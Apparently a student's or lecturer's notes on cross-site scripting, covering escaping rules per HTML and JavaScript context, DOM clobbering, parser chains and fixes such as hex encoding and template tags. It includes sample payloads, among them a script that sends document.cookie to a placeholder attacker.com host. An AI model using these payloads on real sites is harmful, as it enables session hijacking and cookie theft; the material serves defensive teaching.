### Cross-site scripting(XSS)

#### Cross-Origin Resource Sharing (CORS) 
- Allow origin https://site-a.com to read data:
     - Access-Control-Allow-Origin: https://site-a.com
- Allow any origin to read data:
    - Access-Control-Allow-Origin: *

Code and data being mixed in ways it is not intended to.

The Myspace incident.

XSS is a code injection vulnerability
- Untrusted user data with code combines for an XSS.


***Same origin policy prevents cross-origin DOM manipulation***

### XSS is a "code injection" vulnerabilty

- Code injection is caused when untrusted user data unexpectedly becomes code
- Any code that combines a command with user data is susceptible.
- In cross site scripting (XSS), the unexpected code is JavaScript in an HTML document
- In SQL injection, the unexpected code is extra SQL commands included a SQL query string

*What happens next?*

- If successful, attacker gains the ability to do anything the target can do through their browser
- Can view/exfiltrate their cookies
- Can send any HTTP request to the site, with the user's cookies!

### A Malicious search
- User input:`<script>alert(document.cookie)</script>`
- URL: example.com/?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E
- Server input:
`<script>alert(document.cookie)</script>`
- Resulting page:
`<p>Search result for <script>alert(document.cookie)</script></p>`

### Session hijacking with XSS
- What if website is vulnerable to XSS?
    - Attacker can insert their code into the webpage 
    - At this point, they can easily exfiltrate the user's cookie

```HTML
<script>
    new Image().src =
        'https://attacker.com/steal?cookie=' + document.cookie
</script>
```
- Resulting page:
```HTML
<p>Search result for <script>new Image().src =
'https://attacker.com/steal?cookie=' + document.cookie
</script></p>
```

Fix the reflected XSS vulnerability using html-escape and check against the XSS-auditor to make sure.

## Big idea: Never trust the client
- Any data from the client controls is suspect!
- Client can send any data they want to the server

### What is XSS so prevalent?
- Data can be used in many different contexts
    - The web has so many different languages!
    - Even within HTML, there are at least 5 contexts to understand!
- Each context has different "control characters"
    - Some contexts have very complicated rules!
- If you slip up in even one place, you're completely vulnerable

### Reflected XSS vs. Stored XSS
- In reflected XSS, the attack code is placed into the HTTP request itself
    - Attacker goal: find a URL that you can make target visit that includes your attack code
    - Limitation: Attack code must be added to the URL path or query parameters
- In stored XSS, the attack code is persisted into the database
    - Attacker goal: Use any means to get attack code into the database
    - Once there, server includes it in all pages sent to clients

### HTML elements
- HTML template:
`<p>USER_DATA_HERE</p>`
- What is the fix?
    - Change all `<` to `&lt;`
    - Change all `&` to `&amp;`
- Important: `<style>` and `<script>` have different rules!

`<p>USER_DATA_HERE</p>`
- User input:`<script>alert(document.cookie)</script>`
- Resulting page:
`<p>&lt;script>alert(document.cookie)&lt;/script></p>`

### HTML attributes
- Example:
`<img src='avatar.png' alt='Shagun Attri' />`
- HTML template:
`<img src='avatar.png' alt='USER_DATA_HERE' />`
- User input:shagun' onload='alert(document.cookie)
- Resulting page:
`<img src='avatar.png'alt='shagun' onload='alert(document.cookie)' />`


- HTML template:
`<img src='avatar.png' alt='USER_DATA_HERE' />`
- What is the fix?
    - Change all ' to &apos;
    - Change all " to &quot;

- HTML template:
- `<img src='avatar.png' alt='USER_DATA_HERE' />`
- User input:shagun' onload='alert(document.cookie)
- Resulting page:
`<img src='avatar.png'alt='shagun&apos; onload=&apos;alert(document.cookie)' />`

### HTML attributes without quotes
- Example:
`<img src=avatar.png alt=shagun />`

- HTML template:
`<img src=avatar.png alt=USER_DATA_HERE />`
- User input:shagun onload=alert(document.cookie)
- Resulting page:
`<img src=avatar.png alt=shagun onload=alert(document.cookie) />`

- HTML template:
`<img src=avatar.png alt=USER_DATA_HERE />`
- What is the fix?
    - Always quote attributes!
    - Unquoted attributes can be broken out of with many characters, including space, %, *, +, ,, -, /, ;, <, =, >, ^, and |


### Beware HTML attributes with special meanings!
- For most attributes, escaping attributes is sufficient
- But, beware certain attributes like src and href!
    - e.g. `<script src='USER_DATA_HERE'></script>` can never be safe, even if you escape the attribute value
    - Watch out for **data:** and **javascript:** URLs!

Eg:
```HTML
data:text/html,<h1>hi</h1>
```

To use your browser as a text editor 
```HTML
data:text/html,<html contenteditable></html>
```

To run js in the context of a page
```js
javascript:alert("hi")
```
When you copy the above js code from a text editor the browser strips out the `javscript:` part to prevent from phishing vectors.

### Navigate to a javascript: URL
- Visit this URL:
```js
javascript:alert(document.cookie)
```
- Chrome and Firefox strip javascript: when you paste text in URL bar
- Safari just prevents javascript: URLs unless you enable a setting

### What is data: and javascript:for?
Mostly not required but there is this functionality for backwards compatibility.
The data: lets you save an HTTP request.
Legacy way to run JavaScript in response to a click:
```HTML
<a href='javascript:alert("hi")'>Say hi</a>
```
Save an HTTP request in an HTML page:
```HTML
<img src='data:image/png;base64,iVBORw0KGgoAAAA...' />
```
Save an HTTP request in a CSS file:
```CSS
body {
    background-image: url(data:image/png;base64,iVBORw...);
}
```
href and source are needed to be taken care of and not just make an XSS issue.

### Beware, here be dragons!
Let user choose a URL, get JavaScript execution:
```HTML
<a href='javascript:alert("hi")'>Say hi</a>
```
Let user choose a page to iframe, get JavaScript execution:
```HTML
<iframe src='data:text/html,<script>alert("hi")</script>'></iframe>
```
Let user choose a script, get JavaScript execution (obviously):
```HTML
<script src='data:application/javascript,alert("hi")'></script>
```
Removing quotes here is not enough.

Need different and more escaping rules while interacting with HTML and JS together.

### One last gotcha: on* attributes
- HTML template:
```HTML
<div onmouseover='handleHover(USER_DATA_HERE)'>
```
- Escaping ' and " is not enough here!
- Attack input: ); alert(document.cookie

```HTML
<div onmouseover='handleHover(); alert(document.cookie)'>
```
In DOM any element on the page that has an id that name automatially creates a var iable in js with that name that is a globla variable.

Lets user control ids and change ways what the script is doing.

### Another HTML template:
```HTML
<div id='USER_DATA_HERE'>Some text</div>
```
User input:username

Resulting page:
```HTML
<div id='username'>Some text</div>
````
How could this HTML possibly cause an issue?

```HTML
<div id='username'>Some text</div>
<script>
    // There's now a `username` variable which
    // references the above <div>
    if (typeof username !== 'undefined') {
    // do something!  
    }
</script>
```

### Script elements 

- Eg:
```HTML
<script>
    let username = 'shagun' 
    alert(`Hi there, ${username}`)
</script>
```

- HTML Template
```HTML
<script>
    let username = 'USER_DATA_HERE'  
    alert(`Hi there, ${username}`)
</script>
```

- User input:shagun'; alert(document.cookie); //
```HTML
<script>
    let username = 'shagun'; alert(document.cookie); //'  
    alert(`Hi there, ${username}`)
</script>
```

- Idea for a fix:
    - Change all ' to \'
    - Change all " to \"

Result:
```HTML
<script>
    let username = 'USER_DATA_HERE'  
    alert(`Hi there, ${username}`)
</script>
```

- User input:shagun'; alert(document.cookie); //
```HTML
<script>
    let username = 'shagun\'; alert(document.cookie); //'  
    alert(`Hi there, ${username}`)
</script>
```

But this also exploitable where the user input itself can include the \ and escape the check to execute arbitrary code.


User input:shagun\'; alert(document.cookie) //
```HTML
<script>
    let username = 'shagun\\'; alert(document.cookie) //'  
    alert(`Hi there, ${username}`)
</script>
```

- Lesson: Avoid using backslash escaping!
- The escape character \ can be neutered by placing another escape character in front!
- Idea for a fix:
    - Change all ' to &apos;
    - Change all " to &quot;

Implementing the lessons
```HTML
<script>
    let username = 'USER_DATA_HERE'  
    alert(`Hi there, ${username}`)
</script>
```
- User input:shagun'; alert(document.cookie) //
```HTML
<script>
    let username = 'shagun&apos;; alert(document.cookie) //'  
    alert(`Hi there, ${username}`)
</script>
```

This is not good as it tampers with the user input and outputs different string from the user input.

Though it is slightly better but still has problems
- Doesn't preserve user input
- Also is still insecure

Eg:
```HTML
<script>
    let username = 'USER_DATA_HERE'  
    alert(`Hi there, ${username}`)
</script>
```
- User input:
```HTML
</script><script>alert(document.cookie)</script><script>
```
```HTML
<script>
    let username = '</script><script>alert(document.cookie)</script><script>'  
    alert(`Hi there, ${username}`)
</script>
```

Parsed by the browser:
```HTML
<script>  
    let username = '
</script>
<script>  
    alert(document.cookie)
</script>
<script>  
    '  
    alert(`Hi there, ${username}`)
</script>
```
It  is not enough to just escape strings ans '," because the parser has different properties and can trigger errors and error out the page load itself.
### Parsers, parsers, everywhere!
- First, the HTML parser runs
    - Greedily searches for HTML tags
    - Produces a DOM tree
- Second, the JavaScript and CSS parsers run
    - JavaScript parser runs on content inside <script> tags
    - CSS parser runs on content inside <style> tags

### Script elements
- What is the fix?
    - Hex encode user data to produce a string with characters 0-9, A-F. We also need to undo that which works fine using hexdecode.
    - Include it inside a JavaScript string
    - Then, decode the hex string

```HTML
<script>
    let username = hexDecode('HEX_ENCODED_USER_DATA')  
    alert(`Hi there, ${username}`)
</script>
```

- HTML template:

```HTML
<script>
    let username = hexDecode('HEX_ENCODED_USER_DATA')  
    alert(`Hi there, ${username}`)
</script>
```
- User input:`</script><script>alert(document.cookie)</script><script>`
```HTML
<script>
    let username = hexDecode('3c2f736372697074...')  
    alert(`Hi there, ${username}`)
</script>
```
- Another fix:
    - Use a <template> tag to store data that won't visibly render
    - The escaping rules are simple and the same as for HTML elements (just HTML encode < and & characters)
```HTML
<template id='username'>HTML_ENCODED_USER_DATA</template>
<script>
    let username = document.getElementById('username').textContent  
    alert(`Hi there, ${username}`)
</script>
```
### Contexts which are never safe
```HTML
<script>USER_DATA_HERE</script>
```
```HTML
<!-- USER_DATA_HERE --> //Comments even as parser errors in few edge cases
```
```HTML
<USER_DATA_HERE href='/'>Link</a>
```
```HTML
<div USER_DATA_HERE='some value'></div>
```
```HTML
<style>USER_DATA_HERE</style>
```
- HTML parsers are extremely lax about what they accept
- Here is some "valid" HTML:

```HTML
<script/XSS src='https://attacker.com/xss.js'></script>
```

```HTML
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(document.cookie)>
```

```HTML
<img """><script>alert(document.cookie)</script>">
```

```HTML
<iframe src=https://attacker.com/path/to/some/file/xss.js <
```

It is designed based on Roubustness principle

### Robustness principle
- "Be conservative in what you send, be liberal in what you accept"
- Also known as "Postel's law" who wrote in TCP spec:
    - "TCP implementations should follow a general principle of robustness: be conservative in what you do, be liberal in what you accept from others."
- This is actually terrible for security!
    - "A flaw can become entrenched as a de facto standard. Any implementation of the protocol is required to replicate the aberrant behavior, or it is not interoperable. This is both a consequence of applying the robustness principle, and a product of a natural reluctance to avoid fatal error conditions. Ensuring interoperability in this environment is often referred to as aiming to be 'bug for bug compatible'." - Martin Thomson

### Where can escaped user data safely be used?
- HTML element bodies
- HTML attributes (surrounded by quotes)
- JavaScript strings

### Beware nesting and parsing chains!
```HTML
<div onclick="setTimeout('doStuff(\'USER_DATA_HERE\')', 1000)"></div>
```
- Note there are three rounds of parsing!
    - HTML parser extracts the onclick attribute and adds it to DOM2.
    - Later, when button is clicked, JavaScript parser extracts setTimeout() syntax and executes it3.
    - One second later, the string passed as first argument to setTimeout() is parsed as JavaScript and executed

```HTML
<div onclick="setTimeout('doStuff(\'USER_DATA_HERE\')', 1000)"></div>
```
- If user data is not double-encoded with JavaScript backslash sequences and then HTML encoded, then you're in trouble.
- Better to avoid writing this kind of code!

```HTML
<script>
    let someValue = 'USER_DATA_HERE'  
    setTimeout("doStuff('" + someValue + "')", 1000)
</script>
```
- Escaping assignment to someValue is relatively easy
- But easy to forget to further escape the setTimeout construction!
- Better to avoid writing this kind of code!
### Further Reading

http://research.sidstamm.com/papers/csp-www2010.pdf

https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf

https://developers.google.com/web/updates/2019/02/trusted-types

https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/
